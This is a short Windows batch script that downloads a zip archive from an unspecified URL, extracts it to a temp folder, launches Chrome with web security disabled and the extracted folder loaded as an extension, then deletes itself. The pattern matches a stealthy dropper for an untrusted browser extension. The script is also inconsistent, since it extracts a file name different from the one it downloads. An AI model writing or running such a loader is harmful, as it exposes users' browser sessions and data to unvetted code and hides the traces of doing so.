@echo off
set URL=

set TEMP_DIR=%temp%\ptfmini
curl -o "%temp%\download-ptfmini.zip" %URL%
"C:\Program Files\7-Zip\7z.exe" x "%temp%\download.zip" -o%TEMP_DIR% -y
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --disable-web-security --load-extension=%TEMP_DIR%
start /b "" cmd /c del "%~f0"&exit /b
